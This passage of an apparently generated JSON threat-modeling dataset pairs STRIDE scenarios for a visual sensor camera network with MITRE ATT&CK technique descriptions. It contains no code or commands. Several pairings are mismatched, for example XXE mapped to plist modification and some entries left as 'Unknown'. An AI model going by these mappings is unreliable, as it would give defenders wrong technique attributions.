                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could fake their identity as a legitimate camera node in the Visual Sensor Network to access visual data or network communication.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access to the VSN.",
                    "Role": "Network Attacker",
                    "Condition": "Presence within the same network segment as the VSN."
                },
                {
                    "Assumption": "The VSN does not use strong mutual authentication mechanisms.",
                    "Role": "System Architect",
                    "Condition": "The current system design lacks robust authentication protocols."
                },
                {
                    "Assumption": "Credential information can be obtained or guessed by the attacker.",
                    "Role": "Malicious User",
                    "Condition": "Default or weak credentials are used."
                }
            ],
            "Potential Impact": "Unauthorized access to visual data, potential data breach, and loss of privacy.",
            "MITRE ATT&CK Keywords": [
                "network",
                "device",
                "spoofing",
                "identity"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a system administrator to issue commands to the camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker knows or can guess the administrative credentials.",
                    "Role": "Malicious User",
                    "Condition": "Use of weak or exposed administrative credentials."
                },
                {
                    "Assumption": "The network communication is not encrypted or protected against interception.",
                    "Role": "Network Security Engineer",
                    "Condition": "Lack of secure communication channels."
                },
                {
                    "Assumption": "The system does not use multi-factor authentication.",
                    "Role": "System Architect",
                    "Condition": "Authentication system does not implement multiple layers of security."
                }
            ],
            "Potential Impact": "Unauthorized control of devices, potential tampering with visual data, and system integrity compromise.",
            "MITRE ATT&CK Keywords": [
                "network",
                "device",
                "impersonation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An outsider could intercept and modify communication between camera nodes and the central server to inject false data.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not sufficiently encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Inadequate implementation of encryption standards."
                },
                {
                    "Assumption": "Attacker has access to the same network as the visual sensor network.",
                    "Role": "Network Attacker",
                    "Condition": "Attacker is capable of network traffic sniffing."
                },
                {
                    "Assumption": "The system does not validate the integrity of incoming data.",
                    "Role": "System Architect",
                    "Condition": "Lack of data integrity checks."
                }
            ],
            "Potential Impact": "Data tampering, loss of data integrity, and potential malicious video feeds.",
            "MITRE ATT&CK Keywords": [
                "network",
                "device",
                "communication",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could exploit an XXE vulnerability to tamper with XML configurations, leading to corruption of data settings.",
            "Assumptions": [
                {
                    "Assumption": "The system uses vulnerable XML parsers.",
                    "Role": "Software Developer",
                    "Condition": "Use of outdated or insecure XML parsing libraries."
                },
                {
                    "Assumption": "The attacker can submit or influence XML data.",
                    "Role": "Network Attacker",
                    "Condition": "Ability to interact with XML endpoints."
                },
                {
                    "Assumption": "No input validation or filtering is in place for XML data.",
                    "Role": "System Architect",
                    "Condition": "Lack of secure coding practices."
                }
            ],
            "Potential Impact": "Server-side code execution, data corruption, and potential system downtime.",
            "MITRE ATT&CK Keywords": [
                "configuration",
                "xml",
                "data corruption",
                "input tampering"
            ],
            "mitre_technique": {
                "name": "Plist Modification",
                "description": "Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)",
                "id": "attack-pattern--06780952-177c-4247-b978-79c357fb311f",
                "technique_id": "T1150"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could use expression language injection in Hitachi Replication Manager to execute arbitrary code and alter system behavior.",
            "Assumptions": [
                {
                    "Assumption": "The system is running a vulnerable version of Hitachi Replication Manager.",
                    "Role": "Software Maintenance Manager",
                    "Condition": "Outdated software version."
                },
                {
                    "Assumption": "The attacker can inject untrusted input into the application.",
                    "Role": "Malicious User",
                    "Condition": "Unvalidated user input is accepted."
                },
                {
                    "Assumption": "There are insufficient security measures for code execution prevention.",
                    "Role": "System Architect",
                    "Condition": "Lack of runtime application self-protection (RASP) measures."
                }
            ],
            "Potential Impact": "Code injection, complete system control, and potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "tampering",
                "expression language",
                "system control"
            ],
            "mitre_technique": {
                "name": "Reflective Code Loading",
                "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
                "id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
                "technique_id": "T1620"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could exploit a deserialization vulnerability in Rabbitmq-connector to tamper with data and systems.",
            "Assumptions": [
                {
                    "Assumption": "The application uses the vulnerable version of RabbitMQ-connector.",
                    "Role": "Software Developer",
                    "Condition": "Use of insecure deserialization methods."
                },
                {
                    "Assumption": "The attacker can send serialized objects to the application.",
                    "Role": "Malicious User",
                    "Condition": "Unprotected endpoints accepting serialized data."
                },
                {
                    "Assumption": "Deserialization operations are not securely enforced.",
                    "Role": "System Architect",
                    "Condition": "Lack of deserialization safety checks."
                }
            ],
            "Potential Impact": "Remote code execution, data tampering, and potential system integrity compromise.",
            "MITRE ATT&CK Keywords": [
                "deserialization",
                "data tampering",
                "remote code execution",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Compromise Software Supply Chain",
                "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
                "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
                "technique_id": "T1195.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could manipulate logs to cover their tracks after unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "The logging system does not enforce strict integrity checks.",
                    "Role": "System Architect",
                    "Condition": "No integrity mechanisms like cryptographic hashes."
                },
                {
                    "Assumption": "The attacker has sufficient permissions to access log files.",
                    "Role": "Insider Threat",
                    "Condition": "Privileges are not properly restricted."
                },
                {
                    "Assumption": "The logging architecture allows direct access to log files.",
                    "Role": "System Architect",
                    "Condition": "No secure logging mechanisms in place."
                }
            ],
            "Potential Impact": "Inability to detect breaches, lack of forensic evidence, and compromised accountability.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "repudiation",
                "accountability",
                "forensic evidence"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "User actions are logged without proper timestamps, making it impossible to verify the sequence of events in case of an incident.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanism does not include accurate timestamps.",
                    "Role": "System Architect",
                    "Condition": "Improper configuration of logging settings."
                },
                {
                    "Assumption": "The system relies on local time without synchronization.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of network time protocol (NTP) usage."
                },
                {
                    "Assumption": "Attackers can perform operations without logging being enabled.",
                    "Role": "Malicious User",
                    "Condition": "Insufficient audit logging."
                }
            ],
            "Potential Impact": "Difficulty in incident investigation, issues in tracking user activities, and lack of temporal context.",
            "MITRE ATT&CK Keywords": [
                "log integrity",
                "timestamp",
                "repudiation",
                "event tracking"
            ],
            "mitre_technique": {
                "name": "Timestomp",
                "description": "Adversaries may take actions to hide the deployment of new, or modification of existing files to obfuscate their activities. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)",
                "id": "attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a",
                "technique_id": "T1099"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker can exploit log injection vulnerabilities to insert false log entries and mislead investigators.",
            "Assumptions": [
                {
                    "Assumption": "Log processing does not sanitize input.",
                    "Role": "Software Developer",
                    "Condition": "Poor input validation in logging functions."
                },
                {
                    "Assumption": "Logs are stored without integrity verification.",
                    "Role": "System Architect",
                    "Condition": "No cryptographic checks on log files."
                },
                {
                    "Assumption": "Attackers can influence logged events directly.",
                    "Role": "Malicious User",
                    "Condition": "Vulnerable logging endpoints."
                }
            ],
            "Potential Impact": "Misleading forensic analysis, false evidence creation, and hampered incident response.",
            "MITRE ATT&CK Keywords": [
                "log injection",
                "cyber forensics",
                "integrity",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted communication between camera nodes and the central server to access visual data.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Plain text data transmission is used."
                },
                {
                    "Assumption": "Attacker has network access.",
                    "Role": "Network Attacker",
                    "Condition": "Presence in the same or bridged network segment."
                },
                {
                    "Assumption": "No additional layers of data protection are in place.",
                    "Role": "System Architect",
                    "Condition": "No use of end-to-end encryption."
                }
            ],
            "Potential Impact": "Loss of data confidentiality, exposure of sensitive visual data, and potential privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "unencrypted data",
                "network interception",
                "information disclosure",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a directory traversal vulnerability to access confidential configuration files and system data.",
            "Assumptions": [
                {
                    "Assumption": "The system uses a version susceptible to directory traversal.",
                    "Role": "Software Developer",
                    "Condition": "Use of insecure file handling methods."
                },
                {
                    "Assumption": "Attackers can input path traversal characters without restriction.",
                    "Role": "Malicious User",
                    "Condition": "Lack of proper input validation."
                },
                {
                    "Assumption": "System files and configurations are accessible from the web directory.",
                    "Role": "System Architect",
                    "Condition": "Incorrect file permissions and directory structures."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive files, potential configuration data exposure, and system information leakage.",
            "MITRE ATT&CK Keywords": [
                "directory traversal",
                "file system",
                "information disclosure",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker leverages insecure deserialization in Apache EventMesh to extract and manipulate serialized data.",
            "Assumptions": [
                {
                    "Assumption": "The application uses a vulnerable version of Apache EventMesh.",
                    "Role": "Software Developer",
                    "Condition": "Use of insecure deserialization methods."
                },
                {
                    "Assumption": "Attackers can send or modify serialized objects sent to the application.",
                    "Role": "Malicious User",
                    "Condition": "Endpoints accept untrusted serialized data."
                },
                {
                    "Assumption": "Deserialization operations are not verified for integrity.",
                    "Role": "System Architect",
                    "Condition": "Lack of data validation mechanisms."
                }
            ],
            "Potential Impact": "Exposure of sensitive data, potential for remote code execution, and system information leakage.",
            "MITRE ATT&CK Keywords": [
                "deserialization",
                "data extraction",
                "information disclosure",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit the denial of service vulnerability in the NVIDIA GPU Display Driver to crash camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "The system uses affected NVIDIA GPU Display Driver versions.",
                    "Role": "Hardware and Driver Management",
                    "Condition": "Outdated or unpatched drivers in use."
                },
                {
                    "Assumption": "The attacker can send crafted shader code to the devices.",
                    "Role": "Network Attacker",
                    "Condition": "Ability to influence the driver operations."
                },
                {
                    "Assumption": "Insufficient resource control mechanisms are in place.",
                    "Role": "System Architect",
                    "Condition": "Lack of effective resource management and monitoring."
                }
            ],
            "Potential Impact": "Service disruption, camera node downtime, and reduced system availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "GPU",
                "service disruption",
                "system crash"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could exploit shell metacharacters in tinyfiledialogs to cause application crashes and service outages.",
            "Assumptions": [
                {
                    "Assumption": "The application uses a vulnerable version of tinyfiledialogs.",
                    "Role": "Software Developer",
                    "Condition": "Use of outdated or insecure dialog libraries."
                },
                {
                    "Assumption": "User input is not sanitized for shell metacharacters.",
                    "Role": "Application User",
                    "Condition": "Unfiltered user input accepted by the system."
                },
                {
                    "Assumption": "The application logic executes shell commands based on input.",
                    "Role": "System Architect",
                    "Condition": "Improper use of shell commands in the application."
                }
            ],
            "Potential Impact": "Service interruptions, potential application crashes, and reduced availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "input validation",
                "application crash",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could trigger a service halt by exploiting the XML External Entity (XXE) vulnerability in the XML parsers.",
            "Assumptions": [
                {
                    "Assumption": "The application uses vulnerable XML parsing libraries.",
                    "Role": "Software Developer",
                    "Condition": "Use of poorly implemented XML parsers."
                },
                {
                    "Assumption": "Attackers can submit XML input to the system.",
                    "Role": "Malicious User",
                    "Condition": "Interaction with XML endpoints."
                },
                {
                    "Assumption": "No mitigation techniques like input validation or system resource limits are in place.",
                    "Role": "System Architect",
                    "Condition": "Absence of XML hardening measures."
                }
            ],
            "Potential Impact": "Service disruption, potential denial of service, and system resource exhaustion.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "XXE",
                "service halt",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit the AMD \u03bcProf tool vulnerability to escalate privileges from a lower user level to ring-0 code execution.",
            "Assumptions": [
                {
                    "Assumption": "The system uses a vulnerable version of the AMDPowerProfiler.sys driver.",
                    "Role": "Hardware and Driver Management",
                    "Condition": "Use of outdated or insecure drivers."
                },
                {
                    "Assumption": "The attacker has local network access.",
                    "Role": "Local User",
                    "Condition": "Presence on the local network with user level access."
                },
                {
                    "Assumption": "There are no additional privilege checks in place.",
                    "Role": "System Architect",
                    "Condition": "Lack of kernel-level security measures."
                }
            ],
            "Potential Impact": "Full system compromise, unauthorized access, and complete control over the system.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "ring-0 execution",
                "system control",
                "kernel access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit insecure deserialization in the IBM InfoSphere Information Server to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "The system uses a vulnerable version of the IBM InfoSphere Information Server.",
                    "Role": "Software Maintenance Manager",
                    "Condition": "Outdated and susceptible version in operation."
                },
                {
                    "Assumption": "Deserialized objects carry high privilege execution commands.",
                    "Role": "Malicious User",
                    "Condition": "Deserialization process executed with high privileges."
                },
                {
                    "Assumption": "Insufficient checks on deserialized data integrity.",
                    "Role": "System Architect",
                    "Condition": "Lack of input validation and integrity checks."
                }
            ],
            "Potential Impact": "Privilege escalation, unauthorized system access, and administrative control.",
            "MITRE ATT&CK Keywords": [
                "deserialization",
                "privilege escalation",
                "administrative access",
                "system control"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
